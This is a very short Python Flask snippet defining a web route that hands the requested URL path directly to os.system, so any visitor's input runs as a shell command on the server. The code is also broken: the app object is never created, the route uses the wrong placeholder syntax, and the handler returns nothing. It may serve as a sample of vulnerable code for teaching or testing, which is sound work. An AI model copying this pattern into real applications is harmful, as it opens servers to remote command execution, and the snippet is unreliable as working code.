from flask import Flask
import os

@app.get('/{path}')
def home(path):
  os.system(path)
